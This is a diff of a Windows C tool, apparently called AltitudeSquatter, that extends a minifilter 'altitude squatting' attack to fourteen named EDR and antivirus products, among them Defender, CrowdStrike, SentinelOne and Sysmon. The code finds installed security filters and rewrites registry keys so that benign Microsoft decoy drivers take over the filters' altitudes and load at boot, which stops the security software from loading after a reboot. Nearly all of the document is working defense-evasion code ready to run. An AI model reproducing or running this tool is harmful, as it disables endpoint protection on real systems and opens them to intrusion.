@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
 
 static BOOL SetRegSz(LPCSTR subKey, LPCSTR name, LPCSTR value)
 {
@@ -35,59 +36,146 @@ static BOOL SetRegDword(LPCSTR subKey, LPCSTR name, DWORD value)
     return TRUE;
 }
 
-typedef struct {
-    const char *decoy;
-    const char *instanceSubkey;
-    const char *targetAltitude;
-    const char *displaced;
-} SquatEntry;
+static BOOL SvcKeyExists(const char *svcName)
+{
+    char subKey[512];
+    _snprintf(subKey, sizeof(subKey), "SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
+    HKEY hKey;
+    LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);
+    if (rc == ERROR_SUCCESS) { RegCloseKey(hKey); return TRUE; }
+    return FALSE;
+}
 
-int main(void)
+typedef struct {
+    const char *edr;
+    const char *filter;
+    const char *altitude;
+    const char *decoy;
+    const char *decoyInstance;
+} Target;
+
+static Target targets[] = {
+    {"defender",    "WdFilter",             "328010",  "npsvctrig",  "npsvctrig"},
+    {"mssecflt",    "MsSecFlt",             "385600",  "WIMMount",   "WIMMount"},
+    {"sysmon",      "SysmonDrv",            "385201",  "storqosflt", "storqosflt"},
+    {"crowdstrike", "csagent",              "328010",  "npsvctrig",  "npsvctrig"},
+    {"sentinelone", "SentinelMonitor",      "385200",  "CldFlt",     "CldFlt"},
+    {"carbonblack", "CbDefenseFilter",      "328000",  "Wof",        "Wof"},
+    {"sophos",      "SophosED",             "326000",  "wcifs",      "wcifs"},
+    {"eset",        "eamonm",               "328000",  "Wof",        "Wof"},
+    {"kaspersky",   "klif",                 "389800",  "FileCrypt",  "FileCrypt"},
+    {"trendmicro",  "TmFileEncDec",         "385300",  "bindflt",    "bindflt"},
+    {"elastic",     "ElasticEndpoint",      "385700",  "luafv",      "luafv"},
+    {"cortex",      "CyveraK",              "328010",  "npsvctrig",  "npsvctrig"},
+    {"cylance",     "CylanceDrv",           "385100",  "storqosflt", "storqosflt"},
+    {"malwarebytes","MBAMSwissArmy",        "385100",  "storqosflt", "storqosflt"},
+};
+#define TARGET_COUNT (sizeof(targets) / sizeof(targets[0]))
+
+static int stricmp_local(const char *a, const char *b)
+{
+    while (*a && *b) {
+        char ca = (*a >= 'A' && *a <= 'Z') ? *a + 32 : *a;
+        char cb = (*b >= 'A' && *b <= 'Z') ? *b + 32 : *b;
+        if (ca != cb) return ca - cb;
+        a++; b++;
+    }
+    return *a - *b;
+}
+
+static void PrintUsage(void)
+{
+    printf("Usage: AltitudeSquatter.exe [target|all|list]\n\n");
+    printf("Targets:\n");
+    for (int i = 0; i < (int)TARGET_COUNT; i++)
+        printf("  %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
+    printf("  all             Squat all detected EDR filters\n");
+    printf("  list            Show detected EDR filters on this system\n");
+}
+
+static BOOL DoSquat(Target *t)
+{
+    char svcKey[512], instKey[512];
+    _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", t->decoy);
+    _snprintf(instKey, sizeof(instKey), "SYSTEM\\CurrentControlSet\\Services\\%s\\Instances\\%s",
+              t->decoy, t->decoyInstance);
+
+    printf("[*] %s -> altitude %s (displaces %s)\n", t->decoy, t->altitude, t->filter);
+    printf("    Decoy: %s | Target EDR: %s\n", t->decoy, t->edr);
+
+    if (!SvcKeyExists(t->decoy)) {
+        printf("    [-] Decoy driver %s not found on this system\n\n", t->decoy);
+        return FALSE;
+    }
+
+    BOOL s1 = SetRegSz(instKey, "Altitude", t->altitude);
+    BOOL s2 = SetRegDword(svcKey, "Start", 0);
+    BOOL s3 = SetRegSz(svcKey, "Group", "FSFilter Bottom");
+
+    if (s1 && s2 && s3) {
+        printf("    [+] %s altitude squatted\n\n", t->filter);
+        return TRUE;
+    }
+    printf("    [-] Partial failure\n\n");
+    return FALSE;
+}
+
+int main(int argc, char *argv[])
 {
     printf("[*] Minifilter altitude squatter\n\n");
 
-    SquatEntry entries[] = {
-        {
-            "WIMMount",
-            "SYSTEM\\CurrentControlSet\\Services\\WIMMount\\Instances\\WIMMount",
-            "385600",
-            "MsSecFlt"
-        },
-        {
-            "npsvctrig",
-            "SYSTEM\\CurrentControlSet\\Services\\npsvctrig\\Instances\\npsvctrig",
-            "328010",
-            "WdFilter"
-        },
-    };
-    int count = sizeof(entries) / sizeof(entries[0]);
-    int ok = 0;
-
-    for (int i = 0; i < count; i++) {
-        SquatEntry *e = &entries[i];
-        char svcKey[512];
-        _snprintf(svcKey, sizeof(svcKey), "SYSTEM\\CurrentControlSet\\Services\\%s", e->decoy);
-
-        printf("[*] %s -> altitude %s (displaces %s)\n", e->decoy, e->targetAltitude, e->displaced);
-
-        BOOL s1 = SetRegSz(e->instanceSubkey, "Altitude", e->targetAltitude);
-        BOOL s2 = SetRegDword(svcKey, "Start", 0);
-        BOOL s3 = SetRegSz(svcKey, "Group", "FSFilter Bottom");
-
-        if (s1 && s2 && s3) {
-            printf("    [+] %s altitude squatted — %s displaced\n\n", e->displaced, e->displaced);
-            ok++;
-        } else {
-            printf("    [-] Partial failure for %s\n\n", e->decoy);
-        }
+    if (argc < 2) {
+        PrintUsage();
+        return 0;
     }
 
-    if (ok == count)
-        printf("[+] All targets squatted. Reboot to apply.\n");
-    else if (ok > 0)
-        printf("[!] %d/%d succeeded. Reboot to apply.\n", ok, count);
-    else
-        printf("[-] All failed. Are you running as admin?\n");
+    if (stricmp_local(argv[1], "list") == 0) {
+        printf("[*] Scanning for EDR minifilters...\n\n");
+        int found = 0;
+        for (int i = 0; i < (int)TARGET_COUNT; i++) {
+            if (SvcKeyExists(targets[i].filter)) {
+                printf("  [!] %-14s  %s (altitude %s)\n", targets[i].edr, targets[i].filter, targets[i].altitude);
+                found++;
+            }
+        }
+        if (!found) printf("  [+] No known EDR minifilters detected\n");
+        else printf("\n[*] %d EDR minifilter(s) detected\n", found);
+        return 0;
+    }
 
-    return ok == count ? 0 : 1;
+    if (stricmp_local(argv[1], "all") == 0) {
+        int total = 0, ok = 0;
+        for (int i = 0; i < (int)TARGET_COUNT; i++) {
+            if (SvcKeyExists(targets[i].filter)) {
+                total++;
+                if (DoSquat(&targets[i])) ok++;
+            }
+        }
+        if (total == 0) {
+            printf("[+] No known EDR minifilters detected\n");
+            return 0;
+        }
+        if (ok == total)
+            printf("[+] All %d targets squatted. Reboot to apply.\n", ok);
+        else
+            printf("[!] %d/%d succeeded. Reboot to apply.\n", ok, total);
+        return ok == total ? 0 : 1;
+    }
+
+    for (int a = 1; a < argc; a++) {
+        BOOL found = FALSE;
+        for (int i = 0; i < (int)TARGET_COUNT; i++) {
+            if (stricmp_local(argv[a], targets[i].edr) == 0 ||
+                stricmp_local(argv[a], targets[i].filter) == 0) {
+                DoSquat(&targets[i]);
+                found = TRUE;
+                break;
+            }
+        }
+        if (!found)
+            printf("[-] Unknown target: %s\n\n", argv[a]);
+    }
+
+    printf("[*] Reboot to apply changes.\n");
+    return 0;
 }
